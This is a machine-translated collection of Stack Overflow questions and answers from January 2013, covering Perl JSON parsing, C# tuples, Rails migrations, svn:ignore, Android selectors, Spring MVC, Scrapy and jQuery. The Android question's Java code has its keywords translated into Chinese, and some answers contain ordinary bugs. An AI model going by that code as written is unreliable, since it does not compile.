onclick\u003d\"Javascript:loadContent(\u0027clubID\u003d2060\u0026compID\u003d6785\u0026leagueTable\u003dY\u0026colour\u003d1E58AC\u0027);\"\u003eAn tSráidbhaile\u003c/a\u003e\u003c/span\u003e\n\t\t\t\u003c/p\u003e\n\t\t\t\u003cp\u003e\n\t\t\t\tTime: 8 00 PM , Venue: Fraher Field\n\t\t\t\u003c/p\u003e\n\t\t\t\u003cp\u003e\n\t\t\t\tReferee: John Condon\n\t\t\t\u003c/p\u003e\n\t\t\u003c/li\u003e\n\t\u003c/ul\u003e\n\u003c/div\u003e\n\u003cdiv class\u003d\"aFixture\" style\u003d\"display:none;\"\u003e\n\t\u003ch5 class\u003d\"primaryColor\"\u003e29.04.12 (Sun)\u003c/h5\u003e\n\t\u003cul class\u003d\"fixtures_list\"\u003e\n\t\t\u003cli\u003e\n\t\t\t\u003cp style\u003d\..... 
```

我希望使用 Beautiful Soup 遍历这些数据，数据本身都是 HTML 代码。我想要它的格式：

```
<div id="fixtures"><div class="aFixture>...... etc... 
```

可以看到'<'、'=' 符号由它们的UNICODE 值而不是相关字符表示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:08:46.187

用于输出的格式选择是愚蠢的。它不是返回 JSON，而是返回调用 JQuery 函数的 JavaScript 代码。

首先，提取 JSON。

```
my ($json) = $content =~ /^parseJSON\((.*)\)$/; 
```

然后，只需使用您最喜欢的 JSON 解析器对其进行解析。

```
use JSON::XS qw( decode_json );
my $html = decode_json($json)->{content}; 
```

输出：

```
<div id="fixtures">
... 
```

# css - 如何跨浏览器复制多个阴影？

> ID：14346704
> 
> 赞同：0
> 
> 时间：2013-01-15T20:52:55.163
> 
> 标签：css, cross-browser

我有这张表，它对当前选定的项目应用了几个框阴影，以使其具有蓝色光晕和脱离页面的感觉。事实证明，在 chrome 或 safari 中不允许将 box-shadow 应用于 a ，但它在 Firefox 中有效。我怎样才能以一种适用于所有/大多数浏览器的方式复制这种效果？

[![示例图像](../Images/20215fadcf8b6e061e8da85ad1b234e7.png)](https://i.stack.imgur.com/G4t3f.png)

# c# - 在列表中查找匹配三个项目的元组

> ID：14346714
> 
> 赞同：2
> 
> 时间：2013-01-15T20:53:10.547
> 
> 标签：c#, string, indexing, tuples, wildcard

我需要用三个给定的项目来获取 a 的索引`Tuple<string,string,string,string>`，`List`但第四个是什么并不重要。前任：

```
Listoftuples.IndexOf(new Tuple<string,string,string,string>("value1","value2","value3","this value does not matter")) 
```

在索引方面是否有通配符，或者有不同的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-15T20:57:29.487

```
int index = Listoftuples.FindIndex(t => t.Item1 == "value1" && t.Item2 == "value2" && t.Item3 == "value3"); 
```

您可能想要创建一个函数来创建谓词：

```
Func<Tuple<string,string,string,string>, bool> CreateMatcher(string first, string second, string third)
{
    return t => t.Item1 == first && t.Item2 == second && t.Item3 == third;
} 
```

那么你可以使用

```
int index = Listoftuples.FindIndex(CreateMatcher("value1", "value2", "value3")); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-15T21:00:44.660

没那么复杂。这是一个通用的辅助方法：

```
public static int IndexOf<TSource, TKey>(this IEnumerable<TSource> source, TKey key
    , Func<TSource, TKey> selector)
{
    int i = 0;
    foreach (var item in source)
    {
        if (object.Equals(selector(item), key))
            return i;
        i++;
    }

    return -1;
} 
```

现在您有了一个`IndexOf`采用选择器的方法，它很简单：

```
list.IndexOf(Tuple.Create("value1", "value2", "value3")
    , item => Tuple.Create(item.Item1, item.Item2, item.Item3)); 
```

请注意，如果您想让它更通用，可以将一个`IComparer<TKey>`作为可选参数添加到该方法。`IndexOf`

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-15T21:09:29.837

虽然 Oded 的回答是（是）正确的，但 Linq 有一个内置的方法来做几乎所有基于列表的事情，所以你不必自己动手。

```
var myElement = (Listoftuples.Select((x,i)=>new {Index = i, 
                          Element = Tuple.Create(x.Item1, x.Item2, x.Item3})
                      .FirstOrDefault(a=>a.Element == TupleToSearchFor);
var myIndex = myElement == null ? -1 : myElement.Index; 
```

分解它：

*   Select() 方法有一个重载，它接受带有两个参数的 lambda；源可枚举的当前元素和源*中*该元素的“索引”（请了解这仅对我们有效，因为我们不会更改原始列表中任何元素的顺序；如果我们首先对其进行排序，则索引Listoftuple 和传递给 Select() 的元素之间不匹配。

    然后我们使用这个方法来生成匿名类型的元素，它为我们做了两件事；首先，我们可以将 Tuple 更改为三个值的 Tuple（每个源 Tuple 的前三个，这是我们关心的），其次，我们可以相对轻松地“固定”原始元素的索引列表供以后参考。

*   FirstOrDefault() 遍历 Select() 调用的结果，直到它找到一个元组与我们正在搜索的元素匹配的元素（或者它没有找到任何东西，在这种情况下它返回 null）。

*   因为 FirstOrDefault() 可能返回 null，所以我们需要检查它。有很多方法可以做到这一点；我用三元语句输入的那个很简单易懂。

最后，myIndex 将具有 Listoftuples 的第一个匹配元素的索引，即 -1，这意味着 Listoftuples 的所有元素都与您搜索的元素不匹配。

# ruby-on-rails - 如何使用迁移

> ID：14346716
> 
> 赞同：0
> 
> 时间：2013-01-15T20:53:13.143
> 
> 标签：ruby-on-rails, laravel

几周前我开始使用 Laravel（我添加了 RoR 作为标签，因为我知道两者之间的迁移有点相似），并且仍在努力适应迁移。我尝试阅读一些文档和教程（针对 Laravel 和其他使用它们的框架，如 Rails），它们通常很好地解释了如何使用它们，但我仍然无法掌握如何有效地使用它们。我有一些问题：

1.  如果我在视图中创建一个表，然后决定添加几列并可能删除其他几列，我该怎么做？我了解编辑现有迁移不是正确的方法。我是否添加了一个新的迁移来添加新列并删除旧列？如果是这样，它们是否有命名约定，当创建一个名为 users 的表时，所有教程通常将迁移命名为 create_users，我是否将此迁移称为 update_users？如果我想对用户进行另一次更新，那么我将有两个名为 Update_Users 的类。此外，我在使用这种方法时遇到的问题是我觉得我对数据库结构没有一个很好的概述，一个表列可能分散在十几个迁移文件中。

2.  如果我想用测试数据填充我的表，最好在单独的迁移中做到这一点，比如 Laravel 4 中的种子？

3.  我应该在每次迁移中只有一个表吗？据了解，在我的 create_users 迁移中，我创建了三个表；用户，角色和角色用户，将它们放在单独的迁移中会更好吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:20:56.567

1.  编辑现有迁移不是要走的路。否则，在部署到生产系统时将不会使用更改（迁移编号存储在数据库本身中以避免再次运行它们）。添加另一个迁移以进行更改。对于更新/更改迁移没有真正的命名约定。所以用你想要的方式命名它。但是，指出您进行迁移的原因的专有名称可能会有所帮助（例如 AddCommentsToUsers）。

2.  Rails 有一种播种机制（请参阅[Screencast](http://railscasts.com/episodes/179-seed-data/)）。你应该使用这个。数据迁移有其缺点。

3.  我更喜欢每次迁移一张表。如果第一个表创建完成但第二个没有完成，那么稍后当您尝试重新运行迁移时（在解决任何问题之后）会遇到麻烦。

# java - 如何忽略 Subversion 中的目录/文件？

> ID：14346717
> 
> 赞同：6
> 
> 时间：2013-01-15T20:53:18.830
> 
> 标签：java, linux, spring, svn, maven

如何设置我的 Subversion 使其忽略 Maven 在 Linux 上生成的目标文件？我不想将它们提交给 SVN。

如何在 Linux 和 Mac 命令行上执行此操作？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2013-01-15T21:00:57.280

要忽略 subversion 中的文件，您需要设置 svn:ignore 属性。你可以在这里看到更多[http://svnbook.red-bean.com/en/1.8/svn.advanced.props.special.ignore.html](http://svnbook.red-bean.com/en/1.8/svn.advanced.props.special.ignore.html)大约一半。

要从项目文件夹中忽略目标文件夹，请运行

```
svn propset svn:ignore target . 
```

或者编辑忽略的文件文件夹列表运行

```
svn propedit svn:ignore . 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2013-01-15T21:18:54.183

在将代码提交到 Subversion 存储库之前，我们总是在目录上设置 svn:ignore 属性以防止某些文件和目录被检入。我们总是排除 IDE 项目文件和 target/ 目录。与其一直记住所有排除项，不如将它们全部放在一个文件中并使用 -F 选项引用该文件：

```
svn propset svn:ignore -F .svnignore . 
```

将此文件放在项目文件夹中

```
.svnignore
target/* 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-10T14:42:53.600

我找到了一种简单的方法，您可以在将目标文件夹添加到修订版然后恢复它之后，将其添加到 Eclipse IDE 中的 svn:ignore。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-15T20:57:29.377

使用`svn propset`：

```
svn propset svn:ignore directory . 
```

# android - 在Android中删除ImageButton的默认背景但保持onClick突出显示

> ID：14346720
> 
> 赞同：3
> 
> 时间：2013-01-15T20:53:23.583
> 
> 标签：android, background, onclick

我的应用程序中有一些 ImageButtons，我已经删除了默认的灰色背景

`android:background="@android:color/transparent"`或者`android:background="@null"`

问题是，它还删除了 onClick 高亮背景（API8 中的橙色和 API16 中的蓝色）

我在这里阅读了很多问答，人们都建议使用`selector`. 而不是为每个按钮制作另一个图像，我只想有一个背景颜色突出显示。有没有一种简单的方法可以实现这一目标？

解决方案：**以编程方式**

```
导入android.view.View；
导入 android.view.View.OnTouchListener；

// ...

btn.setOnTouchListener(新 OnTouchListener() {
    @覆盖
    public boolean onTouch(View v, MotionEvent 事件) {
        if(event.getAction() == (MotionEvent.ACTION_DOWN)) {
            // 设置背景高亮颜色
            btn.setBackgroundResource(R.color.blue);
        }
        if(event.getAction() == (MotionEvent.ACTION_UP)) {
            // 恢复透明
            btn.setBackgroundResource(
                getResources().getColor(android.R.color.transparent));
        }
        返回假；
    }
});

```

它不是*那么*简单，但可以完成这项工作并为我节省大量时间为每个按钮制作另一个图像，而我真的不需要花哨的点击样式。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-15T21:00:05.663

在这种情况下只有两个属性相关 -`background`和`src`。如果您想为所有图像按钮使用相同的背景（带有颜色突出显示），您需要将从按钮更改为按钮的背景部分添加到您设置的图像中`src`，这不是太干净和整洁（但当然你如果你愿意，可以这样做）。

所以我认为这里最好是使用选择器作为背景，正如许多用户所建议的那样。

使用以下代码：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:drawable="@android:color/holo_blue_light" android:state_pressed="true"/>
    <item android:drawable="@android:color/transparent"/>
</selector> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-15T21:11:20.757

您确实需要为此使用选择器。

您可以在选择器中为背景使用颜色，它不需要是 PNG 资源（只需将背景设置为颜色，而不是可绘制资源）。

您将使用特定名称（如 button_sel.xml）将此代码放在您的可绘制文件夹中。

然后在 XML 中将其设置为按钮的背景，如下所示：

```
android:background="@drawable/button_sel" 
```

选择器看起来像这样：

```
<selector
    xmlns:android="http://schemas.android.com/apk/res/android">
    <item
        android:drawable="@color/ab_background"
        android:state_focused="true"
        android:state_pressed="true"/>
    <item
        android:drawable="@color/ab_background"
        android:state_focused="false"
        android:state_pressed="true"/>
    <item
        android:drawable="@color/ab_background_on"
        android:state_focused="true"
        android:state_pressed="false"/>
    <item
        android:drawable="@color/ab_background_on"
        android:state_focused="false"
        android:state_pressed="false"/>
</selector> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-15T20:59:03.740

不要这样认为，您可以通过 API 搜索找到 ImageButton 的预定义选择器，而不是复制代码并按照您需要的方式更改选择器。因此，您将创建一个自定义 ImageButton。

但我不认为有一个简单的方法，就像你想要的那样，只需改变颜色

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-10-18T02:15:15.400

我有同样的问题，但现在已经解决了。如果您正在使用**`android:background="@null`**它将导致根本没有背景，并且不会向用户显示任何按下按钮的动画。

只需添加这行代码即可使图像按钮在单击时闪烁。这是提醒用户单击图像按钮的正确方法。

```
 android:background="?android:selectableItemBackground 
```

# opencl - 使用 clFinish 使我的代码运行得更快

> ID：14346725
> 
> 赞同：2
> 
> 时间：2013-01-15T20:53:37.480
> 
> 标签：opencl

我有一个代码，基本上是：

```
for (...) {
     clEnqueueNDRangeKernel(...)
     clFinish(...)
     clEnqueueTask(...)
     clEnqueueReadBuffer(...) // blocking
} 
```

一切都在一个命令队列中，并且未启用乱序执行模式。

此代码在我的 GPU 硬件上运行大约 7.5 秒。删除 clFinish 调用使其在 12 秒内运行。我读到你需要调用 clFlush 来开始执行队列，但是用 clFlush 替换 clFinish 也可以让它在 12 秒内运行。

如果我理解正确，clFinish 是一个阻塞调用，它等待所有命令完成。如何使用它而不是 clFlush 使我的代码运行得更快？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-16T19:08:09.147

调用 clFinish 可防止代码在 GPU 上调度其他工作项。如果您计划的工作项超出 GPU 的处理能力，则性能会下降。没有代码很难说，但这听起来像是你的问题。

# spring-mvc - Spring MVC 下拉框抛出错误

> ID：14346730
> 
> 赞同：0
> 
> 时间：2013-01-15T20:53:56.430
> 
> 标签：spring-mvc, drop-down-menu, jsp-tags

我按照这个[问题](https://stackoverflow.com/questions/11482993/spring-mvc-dropdown-box)中的步骤操作，但我仍然遇到问题。

我的控制器如下所示...

```
@RequestMapping(value = "listBooks.htm")
public String goToNextPage(Model model, HttpServletRequest request){

    HashMap<String,Map<String,String>> hashMapOfData = new HashMap<String,Map<String,String>>();

    Map<String,String> m = new LinkedHashMap<String,String>();
    m.put("1", "foo");
    m.put("2", "bar");
    hashMapOfData.put("m", m);
    model.addAttribute("dropdownData", hashMapOfData);
.....
} 
```

我的jsp文件...

```
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<form:select path="dropdownData"><br />
 <form:option label="Select..." value=""/>
 <form:options items="${dropdownData}" itemLabel="label" itemValue="value"/>
</form:select> 
```

我得到错误...

org.springframework.beans.NotReadablePropertyException：bean 类 [java.lang.String] 的无效属性“值”：bean 属性“值”不可读或具有无效的 getter 方法：getter 的返回类型是否与参数类型匹配二传手的

但是如果我将我的 jsp 文件更改为...删除`itemLabel="label" itemValue="value"`

```
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<form:select path="dropdownData"><br />
 <form:option label="Select..." value=""/>
 <form:options items="${dropdownData}"/>
</form:select> 
```

该页面确实加载，但下拉框选择是

*   选择...
*   {1=foo, 2=bar}

谁能帮我吗？当谈到 Spring MVC 时，我是一个新手，所以非常详细的回答将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-15T21:03:39.317

错误描述了一切

```
org.springframework.beans.NotReadablePropertyException: Invalid property 'value' of bean class [java.lang.String]: Bean property 'value' is not readable or has an invalid getter method: Does the return type of the getter match the parameter type of the setter 
```

Spring 试图在 java.lang.String 中找到一个获取值的方法，而这并不存在。

我只是使用`List<LabelValueModel>`(LabelValueModel 是您自己制作的东西，它具有标签和值的属性。

你最终的jsp看起来像这样：

```
<%@ taglib prefix="form" uri="http://www.springframework.org/tags/form"%>
<form:select path="dropdownData"><br />
 <form:option label="Select..." value=""/>
 <form:options items="${dropdownData}" itemLabel="label" itemValue="value"/>
</form:select> 
```

LabelValueModel 将只是一个简单的 POJO，以避免绑定到特定技术：

```
public class LabelValueModel
{
  private String label;
  private String value;

  ..public getters..
  ..might consider private setters and only allowing setting through constructor..
} 
```

# mysql - 冗长的 Rails/MySQL 查询

> ID：14346737
> 
> 赞同：0
> 
> 时间：2013-01-15T20:54:22.613
> 
> 标签：mysql, ruby-on-rails-3, activerecord, resque

我有一个查询正在访问一个相当大的 MySQL 用户表，并且需要一段时间才能运行。它目前是 Resque 后台作业的一部分。我被要求可能让它进入我们的 MySQL 从数据库而不是生产环境，因为它会阻止这项工作减慢可能在生产环境中注册的用户。我想知道这是否有意义，如果是这样，我将如何切换我在特定类中查询的数据库？

到目前为止，我的猜测是我会在我的 Resque 工作课程中添加类似下面的内容。我的另一个问题是它是否仅适用于该特定类别，或者它是否会潜在地干扰其他工作并使它们指向错误的地方？

```
class ResqueJob
 @queue = :resque_job

 def self.perform(id)
   ActiveRecord::Base.establish_connection("slave_database")
   users = User.all (for example)
 end
end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:33:08.873

我相信你应该使用[Octopus](https://github.com/tchandy/octopus)。还可以在这里阅读我的小型演示项目：[Octopus Replication Example](https://github.com/pmatsinopoulos/octopus_replication_example)

# twig - 如何在 Phalcon 中使用 Twig 实现继承？

> ID：14346738
> 
> 赞同：1
> 
> 时间：2013-01-15T20:54:24.460
> 
> 标签：twig, phalcon

行。我使用 Twig 作为视图引擎，Phalcon 版本是 0.8

我从这个存储库得到的适配器代码：[github](https://github.com/phalcon/incubator/tree/master/Library/Phalcon/Mvc/View/Engine)我对这段代码做了一个小修改，因为我通过composer包含了Twig。我不会描述这些修改，因为它们并不重要。

所以。我的view目录结构很简单：

```
app
- views
--- index.twig
--- about
---- index.twig 
```

视图来源/index.twig：

```
<html>
<head>
    <title>Phalcon PHP Framework</title>
</head>
<body>
    {% block content 'This is main page' %}
</body>
</html> 
```

和意见来源/about/index.twig：

```
{% extends "index.twig" %}

{% block content %}
    This is About page
{% endblock %} 
```

另外，我有控制器关于（AboutController.php）的单一方法

```
public function indexAction() 
```

它是空的。

行。现在。当我请求页面 /about 时，我希望看到这样的内容：

```
This is About page 
```

但我仍然看到views/index.twig的内容：

```
This is main page 
```

这对我来说有点奇怪。我重新分配块“内容”！

我在模板视图/about/index.twig 中做了一些检查，从块中添加了额外的字符，我收到了来自 Twig 的错误：

```
A template that extends another one cannot have a body in "about/index.twig" 
```

所以。有任何想法吗？

PS 我想我应该调用 tpl views/index.twig 方法 {{ content() }} 但 Twig 对这种方法一无所知。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-23T20:28:50.380

问题是我不够好，无法阅读文档！

为了解决我的问题，我不得不在 View 组件中使用模板的渲染级别：[官方文档](https://phalcon-php-framework-documentation.readthedocs.org/en/latest/reference/views.html#control-rendering-levels)

要使用 Twig 内置的导出功能并使用该引擎强大的继承机制，我们必须设置 level render：

```
$view->setRenderLevel(Phalcon\Mvc\View::LEVEL_ACTION_VIEW); 
```

在这种情况下，引擎会立即处理模板动作的内容。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-31T10:27:46.757

使用 {{ 内容|原始 }}

索引.twig：

```
<h1>Title</h1>
{{ content|raw }} 
```

动作视图：

```
<h2>Title 2</h2> 
```

# php - 使用 CodeIgniter Zip 库备份目录不起作用

> ID：14346741
> 
> 赞同：3
> 
> 时间：2013-01-15T20:54:33.260
> 
> 标签：php, codeigniter

这是我的功能：

```
function backup() 
{ 
    $this->load->library('zip'); 
    $path = str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']); 
    $this->zip->read_dir($path.'/assets/');
    $this->zip->archive('backup.zip'); 
    $this->zip->download('backup.zip');
} 
```

当我访问该功能时，我的浏览器会暂停 10-15 秒，我认为这意味着正在制作存档。但是，加载完成时除了 500 错误之外什么都没有发生。

不幸的是，我无法通过 FTP 直接访问此服务器，否则我会检查我的日志。知道我的代码是否错误吗？我的应用程序安装在 IIS7 上。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T22:39:43.647

> 默认情况下，Zip 存档会将第一个参数中列出的所有目录放在 zip 中。如果您希望忽略目标文件夹之前的树，您可以通过**`FALSE`**

所以 500 内部服务器错误`max_execution_time`最有可能是因为您正在压缩路径中的每个目录。或者你有一个`permission error`. 在这两种方式中，您要做的就是使用：

```
 $this->zip->read_dir($path.'/assets/', FALSE); 
```

**或者：**

```
$this->zip->read_dir('assets/'); 
```

也会起作用。

我刚刚尝试过，它正在工作！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-16T03:40:16.393

```
function back_up(){ 
    $this->load->library('zip'); 
    $path = 'application/'; 
    $time = time();
    $this->zip->read_dir($path);  
    $result = $this->zip->download('backup.'.$time.'.zip'); 
    return $result;  
} 
```

上面的这个功能将备份您的**应用程序**文件夹。举个例子，试试你自己的文件夹。

*我英语说得不好，很抱歉。*

# python - 为什么 Scrapy 会跳过循环？

> ID：14346744
> 
> 赞同：2
> 
> 时间：2013-01-15T20:54:53.473
> 
> 标签：python, scrapy

这个蜘蛛应该循环通过[http://www.saylor.org/site/syllabus.php?cid=NUMBER](http://www.saylor.org/site/syllabus.php?cid=NUMBER)，其中 NUMBER 是 1 到 404 并提取每个页面。但由于某种原因，它会跳过循环中的页面。很多页。例如，它跳过 1 到 16。有人能告诉我发生了什么吗？

这是代码：

```
 from scrapy.spider import BaseSpider
 from scrapy.http import Request
 from opensyllabi.items import OpensyllabiItem

 import boto

 class OpensyllabiSpider(BaseSpider):
      name = 'saylor'
      allowed_domains = ['saylor.org']
      max_cid = 405
      i = 1

      def start_requests(self):
          for self.i in range(1, self.max_cid):
              yield Request('http://www.saylor.org/site/syllabus.php?cid=%d' % self.i, callback=self.parse_Opensyllabi)

      def parse_Opensyllabi(self, response):
          Opensyllabi = OpensyllabiItem()
          Opensyllabi['url'] = response.url
          Opensyllabi['body'] = response.body

          filename = ("/root/opensyllabi/data/saylor" + '%d' % self.i)
          syllabi = open(filename, "w")
          syllabi.write(response.body)

          return Opensyllabi 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T09:22:36.570

尝试这个

```
class OpensyllabiSpider(BaseSpider):
      name = 'saylor'
      allowed_domains = ['saylor.org']
      max_cid = 405

      def start_requests(self):
          for i in range(1, self.max_cid):
              yield Request('http://www.saylor.org/site/syllabus.php?cid=%d' % i, 
                    meta={'index':i},
                    callback=self.parse_Opensyllabi)

      def parse_Opensyllabi(self, response):
          Opensyllabi = OpensyllabiItem()
          Opensyllabi['url'] = response.url
          Opensyllabi['body'] = response.body

          filename = ("/root/opensyllabi/data/saylor" + '%d' % response.request.meta['index'])
          syllabi = open(filename, "w")
          syllabi.write(response.body)

          return Opensyllabi 
```

# php - 将数组从表单传递到 AJAX

> ID：14346749
> 
> 赞同：0
> 
> 时间：2013-01-15T20:55:14.170
> 
> 标签：php, ajax

我有这样的 ajax 代码，它将表单数据传递到 createfinalinvoice.php。

serial_number 和 skid 是一些表单字段的一部分，它们是 name="serial_number[]" 和 name="skid[]"（见下文）

```
$(document).ready(function() {
    $("form#submit").submit(function() {
        // we want to store the values from the form input box, then send via ajax below
        var invoice_temp_id = $('#invoice_temp_id').attr('value');
        var customer = $('#customer').attr('value');
        var date = $('#date').attr('value');
        var shipdate = $('#shipdate').attr('value');
        var shipvia = $('#shipvia').attr('value');
        var ponumber = $('#ponumber').attr('value');
        var rep = $('#rep').attr('value');
        var invoicenotes = $('#invoicenotes').attr('value');
        var serial_number = $('#serial_number').attr('value');
        var skid = $('#skid').attr('value');
        var finalize_invoice = $('#finalize_invoice').attr('value');

        $.ajax({
            type: "POST",
            url: "includes/createfinalinvoice.php?",
            data: "invoice_temp_id="+ invoice_temp_id+
                "&customer="+ customer+
                "&date="+ date+
                "&shipdate="+ shipdate+
                "&shipvia="+ shipvia+
                "&ponumber="+ ponumber+
                "&rep="+ rep+
                "&invoicenotes="+ invoicenotes+
                "&serial_number="+ serial_number+
                "&skid="+ skid+
                "&finalize_invoice="+ finalize_invoice,
            success: function(data) {
                $('form#submit :input').not('input[type="submit"]').val("");
                $('div.success').fadeIn();
                $('div.success').html(data);
            }
        });

        return false;
    });
});

<form>
    <input type="text" name="serial_number[]" id="serial_number" class="serial_number">
    <input type="text" name="skid[]" id="skid" class="skid">
    <input type="text" name="serial_number[]" id="serial_number" class="serial_number">
    <input type="text" name="skid[]" id="skid" class="skid">
    <input type="text" name="serial_number[]" id="serial_number" class="serial_number">
    <input type="text" name="skid[]" id="skid" class="skid">
    <input type="text" name="serial_number[]" id="serial_number" class="serial_number">
    <input type="text" name="skid[]" id="skid" class="skid">
</form> 
```

由于我传递了多个同名，因此将其放入数组中。我很难弄清楚如何让 AJAX 代码读取数组并传递它。到目前为止，代码只是将每个中的第一个作为字符串而不是数组传递。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:02:39.460

尝试使用序列化！创造奇迹

```
$( document ).on( 'submit', "form#submit", function( ) {
 $.ajax({
            type: "POST",
            url: "includes/createfinalinvoice.php?",
            data: $( this ).serialize(),
            success: function(data){
                $('form#submit :input').not('input[type="submit"]').val("");
                $('div.success').fadeIn();
                $('div.success').html(data);
                }
            });
        });
        return false;

}); 
```

我在这里也使用了 jquery `.on`，因为它比仅仅绑定到元素更强大，而且总体上更好。

# jquery - 使用 inArray() 检查坐标是否在 jQuery 数组中

> ID：14346754
> 
> 赞同：2
> 
> 时间：2013-01-15T20:55:26.610
> 
> 标签：jquery, arrays, coordinates

我将一些点作为点映射到画布上，并且我希望将重复的点呈现为更大的点。

我需要检查之前是否已经映射过坐标，所以我想将坐标存储在一个数组中。

这就是我所拥有的。我不确定 .inArray 行。如何检查坐标是否已经在数组中？

```
$(function() {
  var arr = [];
  arr.push([0,1]);
  arr.push([2,1]);
  arr.push([3,1]);
  arr.push([4,1]);
  arr.push([5,1]);

  if(jQuery.inArray("2,1",arr)) {
    alert("not there");
  }

}); 
```

[**这是一个简化的小提琴。**](http://jsfiddle.net/JonMoore/cGheN/1/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T21:15:44.760

据我所知，`inArray`只测试简单值（即不是数组或对象）。您可以`filter`改用：[小提琴](http://jsfiddle.net/cGheN/2/)

```
 var arr = [];
  arr.push([0,1]);
  arr.push([2,1]);
  arr.push([3,1]);
  arr.push([4,1]);
  arr.push([5,1]);

x=2;
y=1;
    var filtered = $(arr).filter(function(){
        thisX = this[0];
        thisY= this[1];
        return x==thisX && y==thisY; 
    });
    if(filtered.length > 0){
       alert("yes"); 
    }
    else {
      alert("no");
    } 
```

要测试范围更改返回条件，如下所示：

```
return (x>thisX-0.5 && x<thisX+0.5) && (y>thisY-0.5 && y<thisY+0.5); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T21:11:00.023

在调试你的小提琴之后，问题似乎与 JavaScript 如何测试相等性有关——两个长度相同、元素相同且顺序相同的数组仍然不被认为是“严格相等”（`===`）。

要解决这个问题，您必须[开发自己的函数来测试相等性](https://stackoverflow.com/questions/7593590/how-to-detect-array-equality-in-javascript)。

# java - 如何让 JPanel 显示在同一区域的其他人之上

> ID：14346755
> 
> 赞同：1
> 
> 时间：2013-01-15T20:55:28.273
> 
> 标签：java, swing, awt, jpanel, layout-manager

所以我正在编写一个小应用程序，需要将一个 JPanel 添加到与另一个 JPanel 相同的区域，并在需要时显示一个 - 也就是按下按钮时，一个消失，另一个显示。一有时间，我会清理帖子，但现在我需要赶时间，以免错过回家的公共汽车。

另外，如果这不可能，请告诉我一种可以复制效果的方法。最好在同一窗口内。

SSCCE 前。进口：

```
public class Demo implements ActionListener {
    static JButton switch = new JButton("Switch");

    public static void main(String[] args) {
        JFrame disp = new JFrame("Demo");
        disp.setLayout(new BorderLayout());
        disp.add(switch, BorderLayout.NORTH);
        JPanel pan1 = new JPanel();
        pan1.setBackground(Color.RED);
        disp.add(pan1);
        JPanel pan2 = new JPanel();
        pan2.setBackground(Color.GREEN);
        disp.add(pan2);
        disp.setVisible(true);
    }

    void actionPerformed(ActionEvent e) {
        System.out.println(e.paramString());
        //Something to switch the JPanels when "switch" is pressed
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:57:43.303

如果我正确理解您的问题，我认为您想要的是使用一个带有 CardLayout 的 JPanel。这反过来又可以容纳其他两个彩色 JPanel。然后，您可以在两者之间切换。然后可以将带有 CardLayout 的 JPanel 添加到您的 BorderLayout.CENTER。

另一种选择是自己管理。保留对 pan1 和 pan2 的引用作为成员变量。然后在执行的操作中，您可以简单地删除 pan1 并添加 pan2。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:59:24.100

这可能是您正在寻找的[JFrame.setContentPane()](http://docs.oracle.com/javase/6/docs/api/javax/swing/JFrame.html#setContentPane%28java.awt.Container%29)

我认为方法签名几乎是不言自明的。

# php - 如何从ajax更改css值

> ID：14346759
> 
> 赞同：0
> 
> 时间：2013-01-15T20:55:35.713
> 
> 标签：php, css, ajax, curl

我是 ajax 的新手，我是 php 和 css 的新手

我有一个使用 cURL 从 url 下载文件的脚本

并将 cURL 进度写入 txt 文件

我使用 ajax 每秒更新一次进度

我设法以 1%、5%、50% 等数字回应结果

我尝试使用进度条 | jQuery UI 但我不能

我有一个非常简单的 css 进度条，我想在 css 值中回显 ajax 值

ajax代码

```
 <script type="text/javascript">

    function Ajax()
    {
        var
            $http,
            $self = arguments.callee;

        if (window.XMLHttpRequest) {
            $http = new XMLHttpRequest();
        } else if (window.ActiveXObject) {
            try {
                $http = new ActiveXObject('Msxml2.XMLHTTP');
            } catch(e) {
                $http = new ActiveXObject('Microsoft.XMLHTTP');
            }
        }

        if ($http) {
            $http.onreadystatechange = function()
            {
                if (/4|^complete$/.test($http.readyState)) {
                    document.getElementById('ReloadThis').innerHTML = $http.responseText;
                    setTimeout(function(){$self();}, 1000);
                }
            };
            $http.open('GET', 'loadtxt.php' + '?' + new Date().getTime(), true);
            $http.send(null);
        }

    }

</script> 
```

加载loadtxt.php

它的代码

```
 <?php
//
$file = "progress.txt";
$f = fopen($file, "r");
while ( $line = fgets($f, 1000) ) {
print $line;
}
?> 
```

读取包含进度的文本文件我有以下css代码

```
<div class="meter-value" style="background-color: #0a0; width: 40%;"> 
```

我想更新这个值

```
width: 40%; 
```

从 ajax 那么如何从 ajax 更新该值我使用以下代码来获取 ajax 值

```
<div id="ReloadThis">Default text</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:14:36.470

你应该改变这个：

```
<div class="meter-value" style="background-color: #0a0; width: 40%;"> 
```

为了这：

```
